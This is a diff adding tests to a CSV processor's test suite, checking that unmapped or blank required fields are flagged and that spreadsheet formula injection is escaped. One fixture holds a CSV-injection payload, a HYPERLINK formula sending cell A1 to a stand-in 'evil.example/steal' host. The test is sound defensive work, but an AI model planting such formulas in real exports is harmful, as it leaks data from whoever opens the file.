@@ -136,6 +136,72 @@ describe("CSV Processor", () => {
       expect(result.csvContent).toContain("jane@example.com");
       expect(result.preview).toBeDefined();
       expect(result.preview.length).toBeLessThanOrEqual(5);
+      // Every required field (Recent Event/Status from the defaults above, plus
+      // Email/First+Last Name/Company/Country from the mapping) actually has a value
+      // on both rows — nothing to flag.
+      expect(result.missingRequiredFields).toEqual([]);
+    });
+
+    it("flags a required field left unmapped instead of silently producing blank rows", async () => {
+      // TARGET_FIELDS marks Email as required and the mapping screen badges it
+      // "Required" — but a rep can click straight through the wizard with Email
+      // left unmapped. Confirmed the pre-fix behavior: success:true,
+      // processedCount:2, a downloadable CSV with a blank Email column throughout,
+      // and no signal anywhere that the export is missing a required field.
+      const { csvProcessorRouter } = await import("./csv-processor-router");
+      const caller = csvProcessorRouter.createCaller(mockAuthContext);
+
+      const rows = [
+        { fname: "Jane", lname: "Smith", company: "Test Inc", country: "US" },
+        { fname: "Bob", lname: "Jones", company: "Demo LLC", country: "US" },
+      ];
+      // Email intentionally left out of the mapping — this is the unmapped case.
+      const mappings = {
+        "First Name": "fname",
+        "Last Name": "lname",
+        "Company": "company",
+        "Country": "country",
+      };
+
+      const result = await caller.processData({
+        rows,
+        mappings,
+        transformations: [],
+        eventName: "2025-01-15-WBN-Test",
+        defaultStatus: "Registered",
+      });
+
+      expect(result.processedCount).toBe(2);
+      expect(result.missingRequiredFields).toContainEqual({ field: "Email", missingCount: 2 });
+    });
+
+    it("counts a required field mapped to a column that is blank on some rows", async () => {
+      const { csvProcessorRouter } = await import("./csv-processor-router");
+      const caller = csvProcessorRouter.createCaller(mockAuthContext);
+
+      const rows = [
+        { email: "jane@example.com", fname: "Jane", lname: "Smith", company: "Test Inc", country: "US" },
+        // Mapped, but this row's source cell is empty — same real-world failure as an
+        // unmapped column: the required field ends up blank in the output.
+        { email: "", fname: "Bob", lname: "Jones", company: "Demo LLC", country: "US" },
+      ];
+      const mappings = {
+        "Email": "email",
+        "First Name": "fname",
+        "Last Name": "lname",
+        "Company": "company",
+        "Country": "country",
+      };
+
+      const result = await caller.processData({
+        rows,
+        mappings,
+        transformations: [],
+        eventName: "2025-01-15-WBN-Test",
+        defaultStatus: "Registered",
+      });
+
+      expect(result.missingRequiredFields).toContainEqual({ field: "Email", missingCount: 1 });
     });
 
     it("normalizes any non-header value the model writes for an unmatched field to null", async () => {
@@ -227,6 +293,46 @@ describe("CSV Processor", () => {
       expect(result.csvContent).toContain("United States");
       expect(result.csvContent).toContain("Canada");
       expect(result.csvContent).toContain("United Kingdom");
+    });
+
+    it("neutralizes a formula-injection payload in an uploaded field instead of writing it raw", async () => {
+      // This is a webinar registrant list — nobody who exports it typed every field
+      // themselves. A company/name value starting with =, +, - or @ is read as a
+      // formula by Excel/Sheets the moment whoever exports this opens the file, not
+      // as the text it looks like here. See shared/csv.ts.
+      const { csvProcessorRouter } = await import("./csv-processor-router");
+      const caller = csvProcessorRouter.createCaller(mockAuthContext);
+
+      const rows = [
+        {
+          email: "jane@example.com",
+          fname: "Jane",
+          lname: "Smith",
+          company: '=HYPERLINK("https://evil.example/steal?x="&A1,"Click")',
+        },
+      ];
+      const mappings = {
+        "Email": "email",
+        "First Name": "fname",
+        "Last Name": "lname",
+        "Company": "company",
+      };
+
+      const result = await caller.processData({
+        rows,
+        mappings,
+        transformations: [],
+        eventName: "2025-01-15-WBN-Test",
+        defaultStatus: "Registered",
+      });
+
+      expect(result.success).toBe(true);
+      // The raw payload, unprefixed, must not appear anywhere in the file.
+      expect(result.csvContent).not.toContain(rows[0].company);
+      // csvRow's defense: a leading single quote makes every affected spreadsheet
+      // application read the cell as text instead of evaluating it. The inner
+      // double quotes are themselves doubled by the surrounding CSV-quote escaping.
+      expect(result.csvContent).toContain('\'=HYPERLINK(""https://evil.example');
     });
   });
 
